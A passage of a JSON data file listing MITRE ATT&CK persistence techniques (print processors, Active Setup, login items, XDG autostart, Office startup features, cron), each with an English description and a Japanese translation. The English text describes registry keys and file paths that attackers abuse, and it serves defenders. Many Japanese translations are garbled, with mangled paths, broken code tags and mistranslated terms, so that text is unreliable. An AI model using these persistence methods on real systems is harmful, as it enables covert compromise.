service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                        "description_jp": "攻撃者はプリントプロセッサを悪用して、システムブート中に悪意のある DLL を実行し、永続化や権限昇格を行う可能性がある。プリントプロセッサは、ブート中にプリントスプーラサービスである `spoolsv.exe` によってロードされる DLL である。(引用: Microsoft Intro Print Processors)\n\n攻撃者は、起動時に悪意のあるDLLをロードするプリントプロセッサを追加することで、プリントスプーラサービスを悪用する可能性があります。プリント プロセッサは、<code>SeLoadDriverPrivilege</code> を有効にしたアカウントで、<code>AddPrintProcessor</code> API 呼び出しによってインストールできます。または、DLLを指すレジストリキー<code>HKLMSYSTEM</code>[CurrentControlSet or ControlSet001]◆ControlPrint</code>[Windowsアーキテクチャ: 例: Windows x64]◆Print Processors</code>[ユーザー定義]◆Driver</code>を追加することで、プリントプロセッサをプリントスプーラサービスに登録できます。\n\n悪意のあるプリント プロセッサが正しくインストールされるには、ペイロードが専用のシステム プリント プロセッサ ディレクトリに配置されている必要があり、このディレクトリは <code>GetPrintProcessorDirectory</code> API 呼び出しで見つけることができるか、このディレクトリからの相対パスを介して参照されます (引用: Microsoft AddPrintProcessor 2018年5月)。プリント プロセッサがインストールされた後、それらを実行するには、ブート中に起動するプリント スプーラ サービスを再起動する必要があります (引用: ESET PipeMon 2020年5月)。\n\nプリントスプーラサービスはSYSTEMレベルの権限で実行されるため、敵がインストールしたプリントプロセッサは昇格した権限で実行される可能性があります。"
                    },
                    {
                        "id": "T1547.014",
                        "name_eng": "Active Setup",
                        "name_jp": "アクティブセットアップ",
                        "description_eng": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
                        "description_jp": "攻撃者は、ローカル・マシンのアクティブ・セットアップにレジストリ・キーを追加することで、永続性を実現することができる。アクティブ・セットアップは、ユーザーがログインしたときにプログラムを実行するために使用されるWindowsのメカニズムである。レジストリ・キーに格納された値は、ユーザがコンピュータにログインした後に実行される(引用: Klein Active Setup 2010)。これらのプログラムは、ユーザのコンテキスト下で実行され、アカウントに関連付けられた権限レベルを持つ。\n\n攻撃者は、<code> HKLMSOFTWAREMicrosoftActive Setup\\Installed Components</code>の下にキーを作成し、<code>StubPath</code>に悪意のある値を設定することで、Active Setupを悪用する可能性があります。この値は、ユーザーがコンピュータにログインしたときに実行されるプログラムとして機能します。 引用：Mandiant Glyer APT 2010）（ 引用：Citizenlab Packrat 2015）（ 引用：FireEye CFR Watering Hole 2012）（ 引用：SECURELIST Bright Star 2015）（ 引用：paloalto Tropic Trooper 2016\n\n攻撃者はこれらのコンポーネントを悪用して、リモートアクセスツールなどのマルウェアを実行し、システムの再起動を通じて永続性を維持することができます。また、攻撃者は[Masquerading](https://attack.mitre.org/techniques/T1036)を使用して、レジストリエントリが正規のプログラムに関連付けられているかのように見せかけることもあります。"
                    },
                    {
                        "id": "T1547.015",
                        "name_eng": "Login Items",
                        "name_jp": "ログイン項目",
                        "description_eng": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)",
                        "description_jp": "攻撃者は、ユーザーのログイン時に実行するログイン項目を追加して、永続性を得たり、特権を昇格させたりする可能性がある。ログイン項目とは、ユーザーがログインしたときに自動的に起動されるアプリケーション、ドキュメント、フォルダ、またはサーバー接続のことです。(引用: Open Login Items Apple) ログイン項目は、共有ファイルリストまたはService Management Frameworkを介して追加できます。(引用: Adding Login Items) 共有ファイルリストのログイン項目は、[AppleScript](https://attack.mitre.org/techniques/T1059/002)などのスクリプト言語を使用して設定できますが、Service Management FrameworkはAPIコール<code>SMLoginItemSetEnabled</code>を使用します。\n\nService Management Framework を使用してインストールされたログイン項目は <code>launchd<//code> を活用し、システム環境設定には表示されず、作成したアプリケーションによってのみ削除できます。(引用: ログイン項目の追加)(引用: SMLoginItemSetEnabled Schroeder 2013) 共有ファイルリストを使用して作成されたログイン項目はシステム環境設定に表示され、起動時にアプリケーションを隠すことができ、launchd ではなく LaunchServices を介して実行され、Finder を使用せずにアプリケーション、ドキュメント、または URL を開くことができます。(引用：Launch Services Apple Developer） ユーザーやアプリケーションは、ログイン項目を使用してユーザー環境を構成し、電子メール、チャット、音楽アプリケーションなど、一般的に使用されるサービスやアプリケーションを起動します。\n\n攻撃者は、[AppleScript](https://attack.mitre.org/techniques/T1059/002) や [Native API](https://attack.mitre.org/techniques/T1106) の呼び出しを利用してログイン項目を作成し、悪意のある実行可能ファイルを起動することができます。(引用: ELC Running at startup) macOS のバージョン 10.5 より前のバージョンでは、攻撃者は [AppleScript](https://attack.mitre.org/techniques/T1059/002）を使用して、ログイン項目を操作するためのAppleScript辞書を持つ「System Events」プロセスにAppleイベントを送信することができます（引用：Login Items AE） 敵は、<code>tell application \"System Events\" to make login item at end with properties /path/to/executable</code>のようなコマンドを使用することができます。(引用: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) このコマンドは、悪意のある実行ファイルのパスを <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm<//code> にあるログイン項目ファイル リストに追加します。(引用: Startup Items Eclectic) また、攻撃者はログインアイテムを使用して、被害者システムを遠隔操作するために使用できる実行可能ファイルを起動したり、ユーザー認証情報の入力を促して特権を昇格させる手段として使用したりすることもできます(引用: objsee mac malware 2017)(引用: CheckPoint Dok)(引用: objsee netwire backdoor 2019)"
                    },
                    {
                        "id": "T1547.013",
                        "name_eng": "XDG Autostart Entries",
                        "name_jp": "XDGオートスタートエントリー",
                        "description_eng": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.\n\nAdversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)",
                        "description_jp": "侵入者は、XDG 自動起動エントリを追加または変更することで、ログイン時にユーザーのデスクトップ環境がロードされる際に、悪意のあるプログラムやコマンドを実行する可能性があります。XDG 自動起動エントリは、XDG 準拠の Linux システムで使用できます。XDG 自動起動エントリは、デスクトップ エントリ ファイル (`.desktop`) を使用して、ユーザーのログイン時にデスクトップ環境を設定します。これらの設定ファイルは、ユーザーログイン時に起動するアプリケーションを決定し、特定のファイルタイプを開くための関連アプリケーションを定義し、リムーバブルメディアを開くために使用するアプリケーションを定義します(引用: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)\n\n攻撃者はこの機能を悪用し、`.desktop`設定ファイルの`Exec`ディレクティブに悪意のあるバイナリやコマンドへのパスを追加することで、永続性を確立する可能性がある。ユーザーのログイン時にデスクトップ環境がロードされると、XDG の自動起動ディレクトリにある `.desktop` ファイルが自動的に実行されます。システム全体の Autostart エントリは `/etc/xdg/autostart` ディレクトリにあり、ユーザーのエントリは `~/.config/autostart` ディレクトリにあります。\n\n攻撃者は、このテクニックを[Masquerading](https://attack.mitre.org/techniques/T1036)と組み合わせて、悪意のあるAutostartエントリーを正当なプログラムに紛れ込ませる可能性がある(引用: Red Canary Netwire Linux 2022)。"
                    },
                    {
                        "id": "T1547.003",
                        "name_eng": "Time Providers",
                        "name_jp": "時間プロバイダー",
                        "description_eng": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
                        "description_jp": "攻撃者はタイムプロバイダーを悪用し、システム起動時にDLLを実行する可能性がある。Windows Timeサービス(W32Time)は、ドメイン間およびドメイン内での時刻同期を可能にする(引用: Microsoft W32Time Feb 2018) W32Timeタイムプロバイダは、ハードウェア/ネットワークリソースからタイムスタンプを取得し、これらの値を他のネットワーククライアントに出力する役割を担う(引用: Microsoft TimeProvider)\n\nタイムプロバイダーは、`HKEY_LOCAL_MACHINESystemCurrentControlSet\\Services\\W32TimeTimeProviders` のサブキーに登録されるダイナミックリンクライブラリー（DLL）として実装される(引用: Microsoft TimeProvider) タイムプロバイダーマネージャーは、サービスコントロールマネージャーによって指示され、システムの起動時やパラメーターが変更されるたびに、このキーの下にリストされ有効になっているタイムプロバイダーをロードして起動する(引用: Microsoft TimeProvider)\n\n特に、`DllName`の値に悪意のあるDLLを指す、任意に命名された新しいサブキーを作成することである。タイムプロバイダの登録には管理者権限が必要ですが、実行はローカルサービスアカウントのコンテキストで実行されます(引用: Github W32Time Oct 2017)"
                    },
                    {
                        "id": "T1547.002",
                        "name_eng": "Authentication Package",
                        "name_jp": "認証パッケージ",
                        "description_eng": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",
                        "description_jp": "攻撃者は認証パッケージを悪用し、システム起動時に DLL を実行する可能性がある。Windowsの認証パッケージDLLは、システム起動時にLSA（Local Security Authority）プロセスによってロードされる。これらのDLLは、複数のログオンプロセスと複数のセキュリティプロトコルをオペレーティングシステムに提供する。(引用：MSDN Authentication Packages)\n\n攻撃者は、<code>\"Authentication Packages\"=&lt;target binary&gt;</code>のキー値を持つバイナリへの参照をWindowsレジストリの場所<code>HKLMSYSTEMCurntionControlLsa</code>に置くことで、LSA認証パッケージによって提供される自動開始メカニズムを永続化のために使用することができる。認証パッケージがロードされると、このバイナリがシステムによって実行される。"
                    },
                    {
                        "id": "T1547.010",
                        "name_eng": "Port Monitors",
                        "name_jp": "ポートモニター",
                        "description_eng": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port",
                        "description_jp": "攻撃者は、ポートモニターを使用して、システムブート中に攻撃者が提供する DLL を実行し、永続化または特権昇格を行う可能性がある。ポートモニターは、<code>AddMonitor</code> API 呼び出しを通じて設定することができ、起動時にロードされる DLL を設定します。(引用: AddMonitor) この DLL は、<code>C:</code><code>Windows</code><code>System32</code><code> に配置することができ、印刷スプーラーサービスである `spoolsv.exe` によって、起動時に SYSTEM レベルの権限でロードされ実行されます。\n\nあるいは、<code>HKLMSYSTEMCurrentControllSetControlPrintMonitors</code>の既存または新規の任意の名前のサブキーの`Driver`値に、そのDLLの完全修飾パス名を書き込むことを許可するパーミッションがあれば、任意のDLLをロードすることができます。レジストリキーには、以下のエントリが含まれる：\n\n* ローカルポート\n* 標準TCP/IPポート\n* USBモニター\n* WSDポート"
                    }
                ]
            },
            {
                "id": "T1137",
                "name_eng": "Office Application Startup",
                "name_jp": "オフィスアプリケーションの起動",
                "description_eng": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)",
                "description_jp": "攻撃者は、マイクロソフト・オフィス・ベースのアプリケーションを、スタートアップ間の永続性のために活用するかもしれない。Microsoft Officeは、企業ネットワーク内のWindowsベースのオペレーティング・システム上でかなり一般的なアプリケーション・スイートである。Officeベースのアプリケーションが起動されたときに、Officeで永続化のために使用できる複数のメカニズムがあります。これには、Officeテンプレートマクロやアドインの使用が含まれます。\n\nOutlookでは、Outlookルール、フォーム、ホームページなど、永続性を得るために悪用できるさまざまな機能が発見されている（引用：SensePost Ruler GitHub）。これらの永続性メカニズムは、Outlook内で機能することも、Office 365を通じて使用することもできる（引用：TechNet O365 Outlook Rules）。",
                "subtechniques": [
                    {
                        "id": "T1137.002",
                        "name_eng": "Office Test",
                        "name_jp": "オフィステスト",
                        "description_eng": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
                        "description_jp": "攻撃者は、Microsoft Officeの「Office Test」レジストリキーを悪用し、侵害されたシステム上で永続性を取得する可能性がある。Office Testレジストリの場所は、Officeアプリケーションが起動するたびに実行される任意のDLLを指定できるようにするために存在する。このレジストリキーは、マイクロソフトがOfficeアプリケーションの開発中にテストやデバッグの目的でDLLをロードするために使用すると考えられています。このレジストリキーは、Officeのインストール時にはデフォルトでは作成されない。 引用：Hexacorn Office Test）（引用：Palo Alto Office Test Sofacy\n\nOffice Test機能には、以下のようなユーザーレジストリキーとグローバルレジストリキーが存在する：\n\n<code>HKEY_CURRENT_USERSoftwareMicrosoftOffice テスト</code></code></span\n<code>HKEY_LOCAL_MACHINE\n\n攻撃者はこのレジストリキーを追加し、WordやExcelなどのOfficeアプリケーションが起動するたびに実行される悪意のあるDLLを指定する可能性があります。"
                    },
                    {
                        "id": "T1137.001",
                        "name_eng": "Office Template Macros",
                        "name_jp": "Officeテンプレートマクロ",
                        "description_eng": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
                        "description_jp": "攻撃者は、侵害されたシステム上で永続性を得るためにMicrosoft Officeのテンプレートを悪用する可能性がある。Microsoft Officeには、一般的なOfficeアプリケーションの一部であり、スタイルをカスタマイズするために使用されるテンプレートが含まれています。アプリケーション内の基本テンプレートは、アプリケーションが起動するたびに使用されます。(引用：Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications（VBA）マクロ（引用：MSDN VBA in Office）をベーステンプレートに挿入し、それぞれのOfficeアプリケーションの起動時にコードを実行して永続性を得るために使用することができます。WordとExcelの両方の例が発見され、公開されている。WordにはデフォルトでNormal.dotmテンプレートが作成され、悪意のあるマクロを含むように変更することができる。Excelはデフォルトではテンプレートファイルが作成されないが、自動的に読み込まれるテンプレートファイルを追加することができる(引用：enigma0x3 normal.dotm)(引用：Hexacorn Office Template Macros) 共有テンプレートも保存され、リモートロケーションから引き出される可能性がある(引用：GlobalDotName Jun 2019)\n\nWord Normal.dotm の場所:<br>。\n<code>C:◆Users&lt;ユーザー名&gt;◆AppData◆Roaming◆Microsoft◆Templates◆Normal.dotm<//code><br\n\nExcel Personal.xlsbの場所:<br>。\n<code>C:¥Users¥Username¥AppData¥Roaming¥Microsoft¥Excel¥XLSTART¥PERSONAL.XLSB</code\n\n例えば、Word 2016は最初に<code>C:³³Program Files (x86)³³Microsoft Office³³の下にあるNormal.dotmを探すか、GlobalDotNameレジストリキーを変更します。GlobalDotName レジストリキーを変更することで、アプリケーションの起動時にロードされるテンプレートに使用する任意の場所、ファイル名、ファイル拡張子を指定することができます。GlobalDotNameを悪用するために、敵対者はまず、テンプレートを信頼できるドキュメントとして登録するか、信頼できる場所に配置する必要があるかもしれない(引用：GlobalDotName Jun 2019)\n\n敵対者は、マクロの使用に関するシステムまたは企業のセキュリティポリシーに応じて、マクロを無制限に実行できるようにする必要があるかもしれません。"
                    },
                    {
                        "id": "T1137.004",
                        "name_eng": "Outlook Home Page",
                        "name_jp": "アウトルック ホームページ",
                        "description_eng": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)",
                        "description_jp": "攻撃者は、Microsoft Outlookのホームページ機能を悪用し、侵害されたシステム上で永続性を得る可能性がある。Outlookのホームページは、Outlookフォルダの表示をカスタマイズするために使用されるレガシー機能である。この機能により、フォルダを開くたびに内部または外部のURLを読み込んで表示することができます。Outlook Home Pageによって読み込まれたときにコードを実行するような、悪意のあるHTMLページを作成することができます（引用：SensePost Outlook Home Page）。\n\n悪意のあるホームページがユーザーのメールボックスに追加されると、Outlookの起動時に読み込まれます。悪意のあるホームページは、適切なOutlookフォルダがロード/リロードされたときに実行される(引用：SensePost Outlook Home Page)"
                    },
                    {
                        "id": "T1137.003",
                        "name_eng": "Outlook Forms",
                        "name_jp": "アウトルックフォーム",
                        "description_eng": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)",
                        "description_jp": "攻撃者は、Microsoft Outlookのフォームを悪用し、侵害されたシステム上で永続性を獲得する可能性がある。Outlookフォームは、Outlookメッセージのプレゼンテーションや機能のテンプレートとして使用される。カスタム Outlook フォームを作成し、同じカスタム Outlook フォームを使用して敵が特別に細工した電子メールを送信すると、コードが実行されるようにすることができる。 引用：SensePost Outlook Forms\n\n悪意のあるフォームがユーザーのメールボックスに追加されると、Outlookの起動時に読み込まれます。悪意のあるフォームが実行されるのは、敵が特別に細工した電子メールをユーザーに送信した場合です。(引用: SensePost Outlook Forms)"
                    },
                    {
                        "id": "T1137.006",
                        "name_eng": "Add-ins",
                        "name_jp": "アドイン",
                        "description_eng": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.",
                        "description_jp": "攻撃者は、Microsoft Officeアドインを悪用して、侵害されたシステム上で永続性を獲得する可能性がある。Officeアドインは、Officeプログラムに機能を追加するために使用できる。(Word/Excelアドインライブラリ（WLL/XLL）、VBAアドイン、Officeコンポーネントオブジェクトモデル（COM）アドイン、オートメーションアドイン、VBAエディタ（VBE）、Visual Studio Tools for Office（VSTO）アドイン、Outlookアドインなどです。(引用：MRWLabs Office 永続アドイン）（引用：FireEye Mail CDS 2018）\n\nアドインは、Officeアプリケーションの起動時にコードを実行するように設定できるため、永続性を得るために使用できる。"
                    },
                    {
                        "id": "T1137.005",
                        "name_eng": "Outlook Rules",
                        "name_jp": "展望ルール",
                        "description_eng": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)\n\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)",
                        "description_jp": "攻撃者は、Microsoft Outlookのルールを悪用して、侵害されたシステム上で永続性を得る可能性がある。Outlookのルールにより、ユーザは電子メール・メッセージを管理するための自動化された動作を定義することができる。良性のルールは、例えば、特定の送信者からの特定の単語が含まれている場合、自動的にOutlookの特定のフォルダに電子メールを移動することができます。悪意のあるOutlookルールを作成することで、敵対者がそのユーザーに特別に細工した電子メールを送信したときに、コード実行をトリガーすることができます（引用：SilentBreak Outlook Rules）。\n\n悪意のあるルールがユーザーのメールボックスに追加されると、Outlookの起動時に読み込まれます。悪意のあるルールは、敵対者がそのユーザーに特別に細工した電子メールを送信したときに実行される(引用：SilentBreak Outlook Rules)"
                    }
                ]
            },
            {
                "id": "T1053",
                "name_eng": "Scheduled Task/Job",
                "name_jp": "スケジュールされたタスク/ジョブ",
                "description_eng": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",
                "description_jp": "攻撃者は、タスク・スケジューリング機能を悪用し、悪意あるコードの初回実行や反復実行を容易にする可能性がある。すべての主要なオペレーティング・システムには、指定した日時に実行されるプログラムやスクリプトをスケジュールするユーティリティが存在する。タスクは、適切な認証（例：Windows環境におけるRPCとファイルとプリンタの共有）を満たせば、リモートシステム上でスケジュールすることもできる。リモートシステム上でタスクをスケジューリングするには、通常、リモートシステムの管理者またはその他の特権グループのメンバーである必要があります。\n\n攻撃者は、タスクスケジューリングを使って、システム起動時や、永続化のためにスケジュールされたベースでプログラムを実行することができる。これらのメカニズムは、指定されたアカウント(昇格した権限/特権を持つアカウントなど)のコンテキストでプロセスを実行するために悪用されることもあります。また、[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218)と同様に、敵対者はタスクスケジューリングを悪用して、信頼されたシステムプロセスの下で1回限りの実行を隠蔽する可能性もある(引用：ProofPoint Serpent)。",
                "subtechniques": [
                    {
                        "id": "T1053.003",
                        "name_eng": "Cron",
                        "name_jp": "クロン",
                        "description_eng": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)",
                        "description_jp": "攻撃者は<code>cron</code>ユーティリティを悪用して、悪意のあるコードを初回または繰り返し実行するためのタスクスケジューリングを行う可能性がある。(引用：20 macOS Common Tools and Techniques) <code>cron</code>ユーティリティは、Unix系OS向けの時間ベースのジョブスケジューラである。  <code> crontab</code> ファイルには、実行される cron エントリのスケジュールと、指定された実行時間が含まれています。<code>crontab</code> ファイルはオペレーティングシステム固有のファイルパスに格納される。\n\n敵対者は Linux または Unix 環境で <code>cron</code> を使用して、システム起動時または [Persistence](https://attack.mitre.org/tactics/TA0003) のスケジュールベースでプログラムを実行する可能性があります。ESXi環境では、cronジョブはcrontabファイル(例えば、`/var/spool/cron/crontabs/root`)を介して直接作成する必要があります(引用: CloudSEK ESXiArgs 2023)。"
                    },
                    {
                        "id": "T1053.005",
                        "name_eng": "Scheduled Task",
                        "name_jp": "予定タスク",
